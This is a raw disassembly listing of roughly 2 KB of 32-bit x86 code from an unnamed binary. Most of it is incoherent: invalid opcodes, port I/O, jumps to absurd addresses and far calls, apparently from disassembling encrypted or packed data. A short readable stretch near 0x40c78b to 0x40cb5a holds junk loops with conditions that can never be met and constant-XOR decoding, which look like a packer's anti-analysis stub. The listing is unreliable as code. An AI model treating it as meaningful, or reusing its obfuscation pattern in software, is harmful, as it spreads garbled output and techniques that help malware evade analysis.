  40c4dd:	(bad)  
  40c4de:	jns    0x40c4bd
  40c4e0:	mov    dh,0x48
  40c4e2:	cmp    BYTE PTR [ebx-0x32],0xe6
  40c4e6:	pop    eax
  40c4e7:	loop   0x40c486
  40c4e9:	cmp    eax,0x7153cd
  40c4ee:	pusha  
  40c4ef:	sub    al,0xd8
  40c4f1:	mov    ch,0x69
  40c4f3:	inc    esp
  40c4f4:	adc    eax,0xae1a9c6f
  40c4f9:	dec    ebx
  40c4fa:	add    al,0x8f
  40c4fc:	cmp    bh,bl
  40c4fe:	sub    cl,BYTE PTR [eax]
  40c500:	push   0x15
  40c502:	or     bl,BYTE PTR [edx+edx*2+0x4f494b03]
  40c509:	mov    cl,BYTE PTR [edi-0x29]
  40c50c:	popf   
  40c50d:	js     0x40c491
  40c50f:	out    0x45,al
  40c511:	mov    esp,0xff981397
  40c516:	jmp    0x51b552c3
  40c51b:	pop    edi
  40c51c:	jmp    0x40c54c
  40c51e:	pop    ebx
  40c51f:	pop    ebp
  40c520:	or     ebx,DWORD PTR [eax]
  40c522:	ret    0xa6f7
  40c525:	mov    bh,0x65
  40c527:	mov    cl,0x36
  40c529:	xlat   BYTE PTR ds:[ebx]
  40c52a:	dec    eax
  40c52b:	or     BYTE PTR [eax+0x5ceaf751],ch
  40c531:	sub    eax,DWORD PTR [ebx]
  40c533:	mov    eax,DWORD PTR es:[ecx-0x5]
  40c537:	dec    edi
  40c538:	(bad)  
  40c539:	fisubr DWORD PTR [edi]
  40c53b:	inc    ebp
  40c53c:	push   0x1e
  40c53e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c53f:	cld    
  40c540:	call   0x9c51:0x6b39d03f
  40c547:	outs   dx,DWORD PTR ds:[esi]
  40c548:	or     ecx,DWORD PTR [esi-0x14]
  40c54b:	jp     0x40c505
  40c54d:	cs out dx,al
  40c54f:	mov    ds:0xa4192152,eax
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	in     al,dx
  40c556:	(bad)  
  40c557:	xor    eax,0x1ba22f3f
  40c55c:	das    
  40c55d:	lods   eax,DWORD PTR ds:[esi]
  40c55e:	add    ah,BYTE PTR [edi+0x55350d70]
  40c564:	or     BYTE PTR [ecx+0x7],dl
  40c567:	jmp    0x40c782
  40c56c:	jnp    0x40c5eb
  40c56e:	xchg   edi,eax
  40c56f:	les    edx,FWORD PTR [ecx+0x72c54b52]
  40c575:	sub    esi,DWORD PTR [eax-0xf]
  40c578:	sub    DWORD PTR [edi-0x788eed35],esi
  40c57e:	jo     0x40c5f0
  40c580:	jb     0x40c601
  40c582:	jo     0x40c5f4
  40c584:	ss pop esp
  40c586:	(bad)  
  40c587:	sar    DWORD PTR [ebx-0x15],1
  40c58a:	pop    esi
  40c58b:	lea    ecx,[eax+0x5bb8acaf]
  40c591:	sub    al,BYTE PTR [esi-0x38]
  40c594:	xor    esi,ebx
  40c596:	ds mov ss:0xbb033206,al
  40c59d:	in     al,dx
  40c59e:	ss loopne 0x40c58e
  40c5a1:	pop    edi
  40c5a2:	pop    es
  40c5a3:	lahf   
  40c5a4:	push   cs
  40c5a5:	or     esi,DWORD PTR [edx+0x58d2e722]
  40c5ab:	into   
  40c5ac:	and    eax,DWORD PTR [esi+0x38]
  40c5af:	shl    ebx,cl
  40c5b1:	jp     0x40c5d0
  40c5b3:	push   ebp
  40c5b4:	std    
  40c5b5:	pop    esp
  40c5b6:	leave  
  40c5b7:	lahf   
  40c5b8:	xor    DWORD PTR [edx],esp
  40c5ba:	mov    ecx,0xb382c648
  40c5bf:	xchg   esp,eax
  40c5c0:	addr16 out 0x28,al
  40c5c3:	outs   dx,DWORD PTR ds:[esi]
  40c5c4:	mov    ch,0xac
  40c5c6:	xor    eax,0xf7c92d27
  40c5cb:	icebp  
  40c5cc:	xchg   edi,eax
  40c5cd:	mov    ah,0x9b
  40c5cf:	in     eax,dx
  40c5d0:	push   0x20
  40c5d2:	leave  
  40c5d3:	dec    ebp
  40c5d4:	xlat   BYTE PTR ds:[ebx]
  40c5d5:	into   
  40c5d6:	sar    DWORD PTR [ebx],1
  40c5d8:	jg     0x40c588
  40c5da:	into   
  40c5db:	(bad)  
  40c5dc:	adc    DWORD PTR [edi-0x114f57ea],edx
  40c5e2:	or     al,0x7e
  40c5e4:	push   ecx
  40c5e5:	idiv   DWORD PTR [ebx+edx*1-0x41]
  40c5e9:	adc    esp,DWORD PTR [ebp-0x73]
  40c5ec:	ss adc esi,ecx
  40c5ef:	pusha  
  40c5f0:	inc    ebx
  40c5f1:	je     0x40c5a0
  40c5f3:	je     0x40c664
  40c5f5:	and    edx,DWORD PTR [eax+ebx*1+0x19]
  40c5f9:	add    ebx,DWORD PTR [esi]
  40c5fb:	mov    dl,0xf5
  40c5fd:	sub    DWORD PTR [edi+0x1a8917a3],ecx
  40c603:	fdivr  QWORD PTR [edx]
  40c605:	rcr    BYTE PTR [eax+0x0],1
  40c608:	and    DWORD PTR [eax+0x2974a8ec],0x627c0c7a
  40c612:	shl    BYTE PTR [edi-0x5b628c56],1
  40c618:	loop   0x40c615
  40c61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c61b:	jne    0x40c5c6
  40c61d:	jae    0x40c5ac
  40c61f:	pushf  
  40c620:	adc    eax,0x54cc671d
  40c625:	or     eax,0x8e1306be
  40c62a:	dec    edi
  40c62b:	jae    0x40c69f
  40c62d:	xor    al,0xf3
  40c62f:	sar    BYTE PTR [ecx-0x397ecc38],cl
  40c635:	cmp    al,0x3
  40c637:	lahf   
  40c638:	xor    DWORD PTR [edx],ebx
  40c63a:	inc    ebp
  40c63b:	rol    BYTE PTR [edi+0x7e6c7063],0xc9
  40c642:	int    0xf9
  40c644:	push   es
  40c645:	mov    ?,WORD PTR [ecx]
  40c647:	mov    esi,0xb2a45a5
  40c64c:	or     ebx,0x2
  40c64f:	repz xchg esp,eax
  40c651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c652:	ffree  st(2)
  40c654:	push   0x23
  40c656:	inc    ebp
  40c657:	jo     0x40c668
  40c659:	xchg   DWORD PTR [edx+0x75dfe38],ebx
  40c65f:	jo     0x40c636
  40c661:	adc    BYTE PTR [eax-0x289ac389],dl
  40c667:	mov    ecx,0xbf75372c
  40c66c:	jle    0x40c6b6
  40c66e:	or     al,0xd9
  40c670:	xor    al,0x2b
  40c672:	inc    ebp
  40c673:	push   edx
  40c674:	aas    
  40c675:	jno    0x40c644
  40c677:	scas   eax,DWORD PTR es:[edi]
  40c678:	push   0xffffffc0
  40c67a:	cmc    
  40c67b:	out    0x43,eax
  40c67d:	dec    eax
  40c67e:	(bad)  
  40c67f:	inc    bl
  40c681:	enter  0xe2cb,0xd4
  40c685:	fidivr WORD PTR [edi-0x32]
  40c688:	push   esi
  40c689:	aam    0x62
  40c68b:	or     ah,ch
  40c68d:	sub    DWORD PTR [ebp-0xf5a9819],ecx
  40c693:	cld    
  40c694:	cmp    DWORD PTR [ecx],esp
  40c696:	jnp    0x40c675
  40c698:	aas    
  40c699:	pusha  
  40c69a:	pop    eax
  40c69b:	adc    DWORD PTR [esi],ebp
  40c69d:	add    dl,dl
  40c69f:	adc    al,0xee
  40c6a1:	jmp    0xa9ca8de0
  40c6a6:	int3   
  40c6a7:	push   ebx
  40c6a8:	jle    0x40c6cc
  40c6aa:	push   0x85d1d579
  40c6af:	mov    al,ds:0x5b1f335d
  40c6b4:	mov    al,0xe5
  40c6b6:	test   DWORD PTR ds:0x8e69d3a9,esi
  40c6bc:	or     ah,BYTE PTR [edx]
  40c6be:	cmp    al,0x52
  40c6c0:	sub    DWORD PTR [ebx],eax
  40c6c2:	adc    DWORD PTR ds:0x4a63a265,edi
  40c6c8:	push   ebp
  40c6c9:	call   DWORD PTR [eax-0x1e]
  40c6cc:	sti    
  40c6cd:	inc    esi
  40c6ce:	cli    
  40c6cf:	inc    edi
  40c6d0:	sub    DWORD PTR ds:0xcb9c321f,edi
  40c6d6:	push   eax
  40c6d7:	ret    
  40c6d8:	sub    al,0xed
  40c6da:	fs int3 
  40c6dc:	inc    ebx
  40c6dd:	icebp  
  40c6de:	in     al,dx
  40c6df:	adc    DWORD PTR [ebx-0x19],edx
  40c6e2:	mov    al,ds:0xde192854
  40c6e7:	(bad)  
  40c6e8:	and    BYTE PTR [ecx-0x70],ch
  40c6eb:	inc    eax
  40c6ec:	adc    BYTE PTR [ecx-0x44],bl
  40c6ef:	dec    ecx
  40c6f0:	sub    edi,DWORD PTR [ecx+0xc]
  40c6f3:	add    DWORD PTR [eax+0x61],eax
  40c6f6:	popa   
  40c6f7:	sub    eax,0xce20556d
  40c6fc:	cmp    eax,DWORD PTR [ebx-0x73]
  40c6ff:	add    BYTE PTR [ebx+0x67027b98],bh
  40c705:	xor    ch,BYTE PTR [edi]
  40c707:	jp     0x40c6f7
  40c709:	sbb    esi,DWORD PTR [ecx-0x7d]
  40c70c:	es push eax
  40c70e:	mov    ds:0x384bc77a,al
  40c713:	push   0x40690e43
  40c718:	sub    DWORD PTR [ebp+0x49],0x3f7ef578
  40c71f:	das    
  40c720:	mov    ah,BYTE PTR [ebx]
  40c722:	hlt    
  40c723:	aad    0x79
  40c725:	std    
  40c726:	cmp    eax,0xd3807c7
  40c72b:	push   esi
  40c72c:	in     eax,dx
  40c72d:	(bad)  
  40c72e:	dec    ebp
  40c72f:	push   eax
  40c730:	add    al,BYTE PTR [edi+0x35]
  40c733:	loop   0x40c71d
  40c735:	inc    ebp
  40c736:	sti    
  40c737:	xchg   esp,eax
  40c738:	loopne 0x40c6bb
  40c73a:	stos   DWORD PTR es:[edi],eax
  40c73b:	inc    BYTE PTR [ebx+edx*4+0x71191bd3]
  40c742:	xchg   esp,eax
  40c743:	or     cl,BYTE PTR [edx]
  40c745:	dec    edi
  40c746:	push   ss
  40c747:	(bad)  
  40c748:	clc    
  40c749:	add    al,0xad
  40c74b:	lock push cs
  40c74d:	inc    ebx
  40c74e:	pop    es
  40c74f:	mov    ch,0x47
  40c751:	inc    edx
  40c752:	pop    es
  40c753:	mov    ds:0xf2fb3d71,al
  40c758:	lods   al,BYTE PTR ds:[esi]
  40c759:	push   0x57
  40c75b:	hlt    
  40c75c:	mov    ebp,0xd9ed6c9b
  40c761:	or     esi,DWORD PTR [ecx+0x13]
  40c764:	xchg   esp,eax
  40c765:	je     0x40c799
  40c767:	push   eax
  40c768:	leave  
  40c769:	out    dx,al
  40c76a:	mov    edi,0x8e1ddf2f
  40c76f:	mov    edi,DWORD PTR [eax-0x16]
  40c772:	sar    esp,0xc
  40c775:	inc    edi
  40c776:	push   ds
  40c777:	lods   eax,DWORD PTR ds:[esi]
  40c778:	mov    DWORD PTR ds:0xc49aa81e,edx
  40c77e:	sub    bl,0xcd
  40c781:	ss add eax,0x32729c
  40c787:	leave  
  40c788:	ret    0x4
  40c78b:	push   ebp
  40c78c:	mov    ebp,esp
  40c78e:	mov    eax,ds:0x416224
  40c793:	mov    edx,0x32729c
  40c798:	and    DWORD PTR ds:0x434372,edi
  40c79e:	sub    eax,edx
  40c7a0:	and    DWORD PTR ds:0x432700,0x0
  40c7aa:	jmp    0x40c7bc
  40c7af:	mov    ecx,DWORD PTR ds:0x432700
  40c7b5:	inc    ecx
  40c7b6:	mov    DWORD PTR ds:0x432700,ecx
  40c7bc:	cmp    DWORD PTR ds:0x432700,0x1c
  40c7c3:	jae    0x40c8aa
  40c7c9:	cmp    DWORD PTR ds:0x432700,0x21
  40c7d0:	jne    0x40c7e4
  40c7d6:	push   0x432dc2
  40c7db:	push   DWORD PTR [ebp-0x1c]
  40c7de:	call   DWORD PTR ds:0x432d1e
  40c7e4:	jmp    0x40c7af
  40c7e9:	and    DWORD PTR ds:0x434386,0x0
  40c7f3:	jmp    0x40c805
  40c7f8:	mov    ecx,DWORD PTR ds:0x434386
  40c7fe:	inc    ecx
  40c7ff:	mov    DWORD PTR ds:0x434386,ecx
  40c805:	cmp    DWORD PTR ds:0x434386,0x1a
  40c80c:	jae    0x40c8aa
  40c812:	cmp    DWORD PTR ds:0x434386,0x9
  40c819:	jne    0x40c82d
  40c81f:	push   0x43441d
  40c824:	push   DWORD PTR [ebp-0x24]
  40c827:	call   DWORD PTR ds:0x4329ea
  40c82d:	cmp    DWORD PTR ds:0x434386,0x8
  40c834:	jne    0x40c847
  40c83a:	mov    ecx,DWORD PTR ds:0x434386
  40c840:	inc    ecx
  40c841:	mov    DWORD PTR ds:0x434386,ecx
  40c847:	jmp    0x40c7f8
  40c84c:	mov    DWORD PTR ds:0x4343a2,0x1c
  40c856:	cmp    DWORD PTR ds:0x4343a2,0x0
  40c85d:	je     0x40c8aa
  40c863:	cmp    DWORD PTR ds:0x4343a2,0xf
  40c86a:	jne    0x40c87c
  40c870:	push   DWORD PTR [ebp-0x14]
  40c873:	push   DWORD PTR [ebp-0x20]
  40c876:	call   DWORD PTR ds:0x432c66
  40c87c:	cmp    DWORD PTR ds:0x4343a2,0x10
  40c883:	jne    0x40c898
  40c889:	xor    ecx,ecx
  40c88b:	xor    ecx,DWORD PTR ds:0x4343a2
  40c891:	dec    ecx
  40c892:	mov    DWORD PTR ds:0x4343a2,ecx
  40c898:	mov    ecx,DWORD PTR ds:0x4343a2
  40c89e:	dec    ecx
  40c89f:	mov    DWORD PTR ds:0x4343a2,ecx
  40c8a5:	jmp    0x40c856
  40c8aa:	mov    ecx,0x7510855
  40c8af:	push   esi
  40c8b0:	mov    esi,DWORD PTR [ebp+0xc]
  40c8b3:	xor    eax,ecx
  40c8b5:	cmp    eax,esi
  40c8b7:	je     0x40d05a
  40c8bd:	mov    eax,ds:0x41621c
  40c8c2:	mov    esi,DWORD PTR [ebp+0xc]
  40c8c5:	sub    eax,edx
  40c8c7:	xor    eax,ecx
  40c8c9:	jmp    0x40cb3d
  40c8ce:	xchg   edi,eax
  40c8cf:	rol    DWORD PTR ds:0xb5744198,1
  40c8d5:	icebp  
  40c8d6:	lods   al,BYTE PTR ds:[esi]
  40c8d7:	add    al,0x98
  40c8d9:	shl    DWORD PTR [edx+edx*8],0x17
  40c8dd:	mov    bh,0x73
  40c8df:	test   DWORD PTR [eax+0x70],esi
  40c8e2:	leave  
  40c8e3:	jle    0x40c955
  40c8e5:	jo     0x40c93a
  40c8e7:	push   edx
  40c8e8:	(bad)  
  40c8e9:	pop    ebp
  40c8ea:	iret   
  40c8eb:	aad    0x2f
  40c8ed:	add    DWORD PTR [edx+eiz*4],0x78
  40c8f1:	shl    DWORD PTR [edx-0x23],1
  40c8f4:	in     al,0x19
  40c8f6:	arpl   WORD PTR [esi-0x4d4aa478],cx
  40c8fc:	xchg   edx,eax
  40c8fd:	and    al,0x2f
  40c8ff:	dec    esp
  40c900:	int3   
  40c901:	(bad)  
  40c902:	cmp    al,0x7b
  40c904:	scas   al,BYTE PTR es:[edi]
  40c905:	les    ecx,FWORD PTR [edi+0x6c90ad2c]
  40c90b:	gs dec edx
  40c90d:	lods   eax,DWORD PTR ds:[esi]
  40c90e:	cli    
  40c90f:	pop    ecx
  40c910:	sbb    al,0x40
  40c912:	jo     0x40c942
  40c914:	cli    
  40c915:	mov    bh,ah
  40c917:	push   edi
  40c918:	fist   WORD PTR [edi+ecx*1-0x1200f673]
  40c91f:	xchg   ebp,eax
  40c920:	dec    ecx
  40c921:	and    bl,dl
  40c923:	mov    dl,0x6e
  40c925:	mov    ds:0xf4d82d62,eax
  40c92a:	push   0xa
  40c92c:	out    0xef,al
  40c92e:	mov    al,ds:0x6fe14af3
  40c933:	(bad)  
  40c934:	repnz mov es,WORD PTR [ebx]
  40c937:	push   cs
  40c938:	loop   0x40c92d
  40c93a:	and    eax,0x32df5544
  40c93f:	ficomp DWORD PTR [edi-0x1c]
  40c942:	in     eax,0x5d
  40c944:	mov    edi,0xd68c6709
  40c949:	loop   0x40c8ec
  40c94b:	repz or edi,eax
  40c94e:	cmp    DWORD PTR [edi-0x7ddd1eef],ebp
  40c954:	inc    edx
  40c955:	arpl   ax,di
  40c957:	outs   dx,BYTE PTR ds:[esi]
  40c958:	addr16 mov bh,0xbf
  40c95b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c95c:	cmp    esi,DWORD PTR [ecx-0x3ef3a548]
  40c962:	push   ebx
  40c963:	inc    ecx
  40c964:	js     0x40c982
  40c966:	sub    BYTE PTR [ebx],bh
  40c968:	ins    DWORD PTR es:[edi],dx
  40c969:	add    eax,0x55dfd271
  40c96e:	or     esp,esi
  40c970:	adc    al,0xa6
  40c972:	stos   BYTE PTR es:[edi],al
  40c973:	aaa    
  40c974:	push   esi
  40c975:	mov    ebx,ds
  40c977:	dec    eax
  40c978:	clc    
  40c979:	pop    ebp
  40c97a:	and    BYTE PTR [eax-0x320fa879],cl
  40c980:	inc    esi
  40c981:	pop    esi
  40c982:	dec    ebp
  40c983:	mov    esp,0xe0f1ce37
  40c988:	xchg   edx,eax
  40c989:	loope  0x40c9c7
  40c98b:	aas    
  40c98c:	mov    al,ds:0x9463b61b
  40c991:	rol    DWORD PTR [eax],cl
  40c993:	iret   
  40c994:	dec    ebp
  40c995:	mov    ?,WORD PTR [edi+0x5f4e6e60]
  40c99b:	fwait
  40c99c:	fwait
  40c99d:	or     eax,0xc028ebaa
  40c9a2:	jae    0x40ca0b
  40c9a4:	sbb    ebx,DWORD PTR [esi]
  40c9a6:	iret   
  40c9a7:	dec    edx
  40c9a8:	fsub   st,st(3)
  40c9aa:	mov    al,0x1a
  40c9ac:	adc    eax,DWORD PTR [edi-0x39]
  40c9af:	shr    BYTE PTR [eax],0x76
  40c9b2:	jno    0x40c9fe
  40c9b4:	in     al,dx
  40c9b5:	in     al,0x86
  40c9b7:	or     BYTE PTR [edi],ah
  40c9b9:	shr    BYTE PTR [ecx-0x1b],1
  40c9bc:	fucomi st,st(7)
  40c9be:	call   FWORD PTR [edx]
  40c9c0:	mov    dh,0x75
  40c9c2:	dec    ebp
  40c9c3:	mov    ecx,0xd1a6c934
  40c9c8:	add    DWORD PTR [edi],ecx
  40c9ca:	add    dh,BYTE PTR [eax+0x7b]
  40c9cd:	push   es
  40c9ce:	ja     0x40c9a9
  40c9d0:	mov    ?,WORD PTR [eax+0x11]
  40c9d3:	or     DWORD PTR ds:[eax-0x7a812c4a],0x2b1ed3d0
  40c9de:	iret   
  40c9df:	jge    0x40ca4f
  40c9e1:	jge    0x40ca57
  40c9e3:	scas   al,BYTE PTR es:[edi]
  40c9e4:	xchg   ebx,eax
  40c9e5:	sbb    bh,bh
  40c9e7:	gs mov esi,0xa407116d
  40c9ed:	push   ebx
  40c9ee:	and    eax,0xb47dd05b
  40c9f3:	jbe    0x40ca6b
  40c9f5:	xrelease mov DWORD PTR [ecx],0x610f3a22
  40c9fc:	xor    bh,dh
  40c9fe:	fisttp QWORD PTR [edi+0xe]
  40ca01:	push   0xd7b40e18
  40ca06:	push   ds
  40ca07:	icebp  
  40ca08:	pop    ebp
  40ca09:	ficomp WORD PTR [eax-0x6180b9e3]
  40ca0f:	cmp    al,0x9b
  40ca11:	into   
  40ca12:	jb     0x40ca3a
  40ca14:	xlat   BYTE PTR ds:[ebx]
  40ca15:	xor    DWORD PTR [edx],0x9a8af9ff
  40ca1b:	sbb    BYTE PTR [eax-0x30],0xd1
  40ca1f:	jbe    0x40c9fb
  40ca21:	fbstp  TBYTE PTR [esi+0x2a]
  40ca24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca25:	test   BYTE PTR ds:0x1d1ccd52,dl
  40ca2b:	xchg   BYTE PTR [ebx+0x6f9e8fea],dh
  40ca31:	push   esp
  40ca32:	mov    cl,ah
  40ca34:	sbb    eax,DWORD PTR [edi+0x756c7287]
  40ca3a:	not    BYTE PTR [esi]
  40ca3c:	iret   
  40ca3d:	xchg   edx,eax
  40ca3e:	rcl    esp,cl
  40ca40:	mov    eax,0x591128bf
  40ca45:	(bad)  
  40ca47:	mov    BYTE PTR [ebx+0x361a650b],al
  40ca4d:	xchg   ecx,eax
  40ca4e:	pop    ss
  40ca4f:	mov    al,BYTE PTR [ecx-0x62]
  40ca52:	loopne 0x40ca11
  40ca54:	icebp  
  40ca55:	sbb    eax,0x3b5c000a
  40ca5a:	cmp    BYTE PTR [esi],bh
  40ca5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca5d:	inc    edx
  40ca5e:	cmp    BYTE PTR [eax+eiz*2],bl
  40ca61:	or     eax,0xb56338d2
  40ca66:	jae    0x40cad6
  40ca68:	int    0x32
  40ca6a:	shl    DWORD PTR [eax+ecx*1+0x51c8d9bf],cl
  40ca71:	test   eax,0xa29ecab8
  40ca76:	rol    BYTE PTR [eax+0x2f],0xa1
  40ca7a:	jle    0x40ca88
  40ca7c:	xor    DWORD PTR [eax+0x4f],ecx
  40ca7f:	push   cs
  40ca80:	ds loopne 0x40ca4a
  40ca83:	push   esi
  40ca84:	in     al,0x5f
  40ca86:	lods   al,BYTE PTR ds:[esi]
  40ca87:	pop    esp
  40ca88:	pop    ss
  40ca89:	push   esi
  40ca8a:	and    eax,0xa4415c6
  40ca8f:	imul   edi,DWORD PTR [esi+0x4d],0xffffffb6
  40ca93:	cmp    esi,DWORD PTR [eax+0x2f]
  40ca96:	xchg   edi,eax
  40ca97:	mov    ah,0x35
  40ca99:	outs   dx,BYTE PTR ds:[esi]
  40ca9a:	pop    esi
  40ca9b:	jmp    0xc84f0cd5
  40caa0:	loopne 0x40cacd
  40caa2:	rcr    DWORD PTR ds:0xaf7d7e1e,cl
  40caa8:	shl    esi,1
  40caaa:	fisubr WORD PTR [ebp+ebx*2-0x5dbd93e9]
  40cab1:	or     BYTE PTR [edx+eax*2-0x2f],bl
  40cab5:	xor    ecx,DWORD PTR [ebx]
  40cab7:	pop    edi
  40cab8:	or     cl,cl
  40caba:	pop    edx
  40cabb:	mov    ebx,edx
  40cabd:	retf   0xc8fe
  40cac0:	and    cl,0xe4
  40cac3:	in     al,dx
  40cac4:	xor    ecx,edi
  40cac6:	in     al,0xea
  40cac8:	jns    0x40ca91
  40caca:	push   0xf6662074
  40cacf:	jae    0x40caa3
  40cad1:	sub    eax,0x843a99fb
  40cad6:	sar    DWORD PTR [esi-0xad6bda8],cl
  40cadc:	pop    es
  40cadd:	inc    esp
  40cade:	adc    DWORD PTR [eax-0x74],esi
  40cae1:	(bad)  
  40cae2:	stc    
  40cae3:	jo     0x40cb4e
  40cae5:	dec    ebp
  40cae6:	push   ecx
  40cae7:	xor    al,0x0
  40cae9:	repz and eax,0xb7000039
  40caef:	push   ecx
  40caf0:	cs repnz add bh,BYTE PTR gs:[eax]
  40caf5:	xchg   esi,eax
  40caf6:	push   ebx
  40caf7:	in     al,0x3c
  40caf9:	and    al,0x91
  40cafb:	sub    al,0xa0
  40cafd:	test   DWORD PTR [ecx-0x88e1b5d],0xc8e72a7
  40cb07:	inc    ecx
  40cb08:	int    0x6b
  40cb0a:	popf   
  40cb0b:	rol    ecx,1
  40cb0d:	stos   DWORD PTR es:[edi],eax
  40cb0e:	stc    
  40cb0f:	aas    
  40cb10:	test   BYTE PTR [edx-0x19],dl
  40cb13:	jnp    0x40cb7d
  40cb15:	fild   QWORD PTR [ecx+ecx*4-0x6620341a]
  40cb1c:	fucomip st,st(3)
  40cb1e:	add    bh,bh
  40cb20:	xchg   edx,eax
  40cb21:	sbb    dh,BYTE PTR [edi+0x1b]
  40cb24:	dec    ebp
  40cb25:	dec    esi
  40cb26:	pop    eax
  40cb27:	nop    DWORD PTR [edx-0x32]
  40cb2b:	popa   
  40cb2c:	icebp  
  40cb2d:	retf   0x50d7
  40cb30:	sub    eax,0xf1383c86
  40cb35:	mov    ds:0x228384cf,eax
  40cb3a:	adc    ah,BYTE PTR [ecx+ebp*8+0x3b]
  40cb3e:	(bad)  
  40cb3f:	jne    0x40cb55
  40cb45:	mov    eax,ds:0x416224
  40cb4a:	add    eax,DWORD PTR ds:0x41621c
  40cb50:	jmp    0x40d044
  40cb55:	mov    eax,DWORD PTR [ebp+0xc]
  40cb58:	xor    eax,ecx
  40cb5a:	jmp    0x40cdce
  40cb5f:	pop    ecx
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	sbb    BYTE PTR [ebx-0xd],al
  40cb64:	push   ecx
  40cb65:	pop    ecx
  40cb66:	mov    dh,0xd4
  40cb68:	(bad)
  40cb6b:	sahf   
  40cb6c:	je     0x40cb6b
  40cb6e:	scas   al,BYTE PTR es:[edi]
  40cb6f:	int3   
  40cb70:	xor    BYTE PTR [eax+0x70],0xc9
  40cb74:	jle    0x40cbe6
  40cb76:	jo     0x40cb83
  40cb78:	adc    ebx,edx
  40cb7a:	or     edi,ebx
  40cb7c:	cmc    
  40cb7d:	dec    esp
  40cb7e:	xchg   bh,cl
  40cb80:	cmp    BYTE PTR [ebp-0x23],0x52
  40cb84:	add    BYTE PTR ds:0x99757d5d,ch
  40cb8a:	f2xm1  
  40cb8c:	and    edi,DWORD PTR [edx-0x75]
  40cb8f:	ret    
  40cb90:	inc    edi
  40cb91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb92:	xchg   esp,eax
  40cb93:	(bad)  
  40cb94:	cld    
  40cb95:	repnz pop esp
  40cb97:	mov    ah,0x47
  40cb99:	adc    al,0x84
  40cb9b:	xchg   ecx,eax
  40cb9c:	push   cs
  40cb9d:	push   esi
  40cb9e:	stos   DWORD PTR es:[edi],eax
  40cb9f:	push   ebx
  40cba0:	adc    eax,0x81e620a6
  40cba5:	mov    BYTE PTR [edx-0x57],ah
  40cba8:	jbe    0x40cbab
  40cbaa:	sub    ebx,ebp
  40cbac:	in     al,0xe7
  40cbae:	pop    ss
  40cbaf:	pop    edx
  40cbb0:	enter  0x64ef,0xc0
  40cbb4:	lock leave 
  40cbb6:	fdiv   QWORD PTR [eax-0x91a562c]
  40cbbc:	bound  ebp,QWORD PTR [eax]
  40cbbe:	retf   
  40cbbf:	int3   
  40cbc0:	mov    esi,0x2307d222
  40cbc5:	and    esp,DWORD PTR [eax+0x54]
  40cbc8:	mov    edi,0xd790b40a
  40cbcd:	sbb    ch,ch
  40cbcf:	mov    cl,0x4b
  40cbd1:	inc    ecx
  40cbd2:	clc    
  40cbd3:	jecxz  0x40cbfa
  40cbd5:	or     BYTE PTR [eax+0x63],bl
  40cbd8:	push   ebp
  40cbd9:	(bad)  
  40cbda:	rcl    al,1
  40cbdc:	add    al,0xf9
  40cbde:	mov    esp,0x4fcf784b
  40cbe3:	sbb    eax,0x1e3c11c7
  40cbe8:	call   0x2dc7:0xad235bd8
  40cbef:	xchg   esp,eax
  40cbf0:	adc    DWORD PTR [edi],eax
  40cbf2:	lods   eax,DWORD PTR ds:[esi]
  40cbf3:	das    
  40cbf4:	cdq    
  40cbf5:	outs   dx,BYTE PTR ds:[esi]
  40cbf6:	scas   al,BYTE PTR es:[edi]
  40cbf7:	jae    0x40cc75
  40cbf9:	xchg   esi,eax
  40cbfa:	cmp    ebx,esp
  40cbfc:	pop    esi
  40cbfd:	jne    0x40cbba
  40cbff:	xor    eax,0x8197ae81
  40cc04:	mov    cl,0x6d
  40cc06:	arpl   WORD PTR [esi+edi*2-0x553f992a],dx
  40cc0d:	ss stos DWORD PTR es:[edi],eax
  40cc0f:	cmp    eax,0x75848c12
  40cc14:	jnp    0x40cbbe
  40cc16:	call   0x850e:0xd90b77d5
  40cc1d:	xor    al,0xb2
  40cc1f:	sbb    ebp,edx
  40cc21:	jne    0x40cbd0
  40cc23:	lds    esp,FWORD PTR [ecx+0x33]
  40cc26:	pop    ecx
  40cc27:	pop    edx
  40cc28:	push   ds
  40cc29:	add    al,dh
  40cc2b:	ss test al,0x69
  40cc2e:	sbb    BYTE PTR [ebx],al
  40cc30:	xor    DWORD PTR [esi+0x50],ecx
  40cc33:	adc    eax,0x83ab2dd3
  40cc38:	or     edi,DWORD PTR [edx+0x3c5d0bcc]
  40cc3e:	mov    cl,0x5
  40cc40:	pop    ecx
  40cc41:	paddsb mm7,QWORD PTR [eax]
  40cc44:	mov    al,ds:0x18502dcc
  40cc49:	test   eax,0x2c0fb05d
  40cc4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc4f:	and    ecx,DWORD PTR ds:[esi]
  40cc52:	in     eax,0x54
  40cc54:	mov    WORD PTR [edi-0x2707a44c],es
  40cc5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc5b:	jns    0x40ccd9
  40cc5d:	push   0xffffff93
  40cc5f:	adc    BYTE PTR [edx+0x45],al
  40cc62:	mov    ebx,0xbe4a0d45
  40cc67:	add    ch,bh
  40cc69:	call   0xff35:0xd77a74b9
  40cc70:	fild   QWORD PTR [edi-0x7136f87e]
  40cc76:	dec    edi
  40cc77:	call   0x7761:0x5897cfc1
  40cc7e:	aaa    
  40cc7f:	ja     0x40cc74
  40cc81:	add    eax,0x88bee37c
  40cc86:	leave  
  40cc87:	(bad)
  40cc8b:	aas    
  40cc8c:	imul   esi,DWORD PTR [edx*2-0x7bbd3ae5],0xfffffff2
  40cc94:	repnz or ebp,eax
  40cc97:	shl    DWORD PTR [ecx],cl
  40cc99:	adc    BYTE PTR [edx],ch
  40cc9b:	sub    DWORD PTR [eax-0x2fee0e47],esp
  40cca1:	repnz aaa 
  40cca3:	(bad)  
  40cca4:	push   edi
  40cca5:	shl    al,cl
  40cca7:	and    al,BYTE PTR [eax-0x28a2db0b]
  40ccad:	std    
  40ccae:	and    DWORD PTR [ecx],ecx
  40ccb0:	cmp    bh,BYTE PTR [ecx-0x4a]
  40ccb3:	mov    al,0x6b
  40ccb5:	in     eax,dx
  40ccb6:	inc    edx
  40ccb7:	push   ds
